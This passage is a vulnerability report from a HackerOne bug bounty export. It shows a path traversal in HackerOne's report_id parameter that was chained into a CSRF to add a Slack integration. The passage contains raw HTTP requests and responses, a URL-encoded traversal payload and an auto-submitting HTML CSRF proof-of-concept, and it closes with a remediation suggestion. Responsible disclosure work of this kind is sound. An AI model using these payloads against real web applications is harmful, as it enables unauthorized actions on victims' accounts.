Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n```\n\nAs you can see here we are out of reports folder and you can see CSRF token in header. So Now you can perform CSRF on get requests. so In a team there is a option for integration like slack. where we use oauth to Integrate. this is the only place where GET requests are performed. if we are able to bypass the state parameter validation we will be able to takeover the Team and in my theory I was only able to test slack and I was not able to bypass the validation, I have requested for other integrations ticket #8741. so here is the theory \n\n#####oauth request :- \nhttps://slack.com/oauth/authorize?client_id=2174110321.11522100978&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&response_type=code&scope=incoming-webhook&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\n\n#####Response:\nhttps://hackerone.com/auth/slack/callback?code={CODE}&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\n\n\nSo now lets try to use this in our CSRF url :- \n\n######Request:\nhttps://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Request of CSRF :-\n```\nGET //auth/slack/callback?code.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: BNkBdXZy5Yi14v1pV0PMwOXB8xfg+HuiBFE36dPJNraPIbDQBKZ6C8xdC2P9E96pSvDOiK/a8t8j+f41iZ3EVg==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n```\n\n######Reponse :- \n\n```\nHTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:20:09 GMT\nContent-Type: text/plain; charset=utf-8\nContent-Length: 9\nConnection: keep-alive\nCache-Control: no-cache\nCf-Railgun: c8927a839b stream 0.000000 0231 5f99\nContent-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: /auth/failure?message=csrf_detected&origin=https%3A%2F%2Fhackerone.com&strategy=slack\n```\n\nYou can see the CSRF has failed. So the problem was with .json at the end of the request. so it blocking our parameters to pass. so i have just url encoded everything and added a fake parameter to handle that json \n\npayload = `code=14582397537.14583819952.b7ff4c7e48&state=9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55&asd=`\n\nUrl encoded :- `code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D`\n\n\n######Request:- \nhttps://hackerone.com/bugs?subject=user&report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=open&substates[]=new&substates[]=needs-more-info&substates[]=triaged&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n\n######Request of CSRF:- \n```\nGET /auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2&asd=.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: w3CpXrUUjtFVEWBdGu67hWO1drWIOLJn7dwzQj/cdoxIiBj7x8ARUiyullewvqnszIRLKscaOxrKdPqeZYiEbA==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n```\n\n######Response :- \n\n```\nHTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:30:14 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 113\nConnection: keep-alive\nCache-Control: private, no-cache, no-store, must-revalidate\nCf-Railgun: 5d12521a91 stream 0.000000 0231 5f99\nContent-Disposition: inline; filename=\"response.html\"\nContent-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: https://hackerone.com/anontest5667/integrations\n\n<html><body>You are being <a href=\"https://hackerone.com/anontest5667/integrations\">redirected</a>.</body></html>\n```\n\nThis 302 redirect is for the successfull integration. as i already said i wasnt able to bypass slack state parameter validation but  maybe other maybe vulnerable, I leave it on you to fix it or wont fix\n\n\n#####Html code:- \n\n```\n<html>\n\t<head>\n\t\t<title> CSRF Attack</title>\n\t</head>\n\t\n\t<body onload=\"document.createElement('form').submit.call(document.getElementById('myForm'))\">\n\t<center><h1>Integration add CSRF</h1></center>\n<form id=\"myForm\" name=\"myForm\" method=\"GET\" action=\"https://hackerone.com/bugs\">\n<input type=\"hidden\" name=\"report_id\" value=\"../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D\"/>\n<center><input type=\"submit\" name=\"submit\"/></center>\n</form>\n\n\t\n\t</body>\n<html>\n\n```\n\n#####Remediation :\ninput validation should be done as if only integer is accepted like you do here https://hackerone.com/reports/asd\n\nLet me know if you need anything \n\nRegards\n*__N B__*\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://hackerone.com", 
            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
            "twitter_handle": "Hacker0x01", 
            "name": "HackerOne"
        }, 
        "handle": "security", 
        "url": "https://hackerone.com/security", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 13, 
        "default_currency": "usd"
    }, 
    "is_published": false
}